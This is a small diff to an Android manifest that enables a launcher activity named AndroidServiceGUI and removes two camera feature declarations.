@@ -42,7 +42,7 @@
 
 		<activity android:name="com.android.service.gui.AndroidServiceGUI"
 			android:label="@string/app_name" android:excludeFromRecents="true"
-			android:enabled="false">
+			android:enabled="true">
 			<intent-filter>
 				<action android:name="android.intent.action.MAIN" />
 				<category android:name="android.intent.category.LAUNCHER" />
@@ -87,8 +87,6 @@
 				<category android:name="android.intent.category.DEFAULT" />
 			</intent-filter>
 		</receiver>
-		<uses-feature android:name="android.hardware.camera" />
-		<uses-feature android:name="android.hardware.camera.autofocus" />
 	</application>
 
 	<uses-sdk android:minSdkVersion="7" />
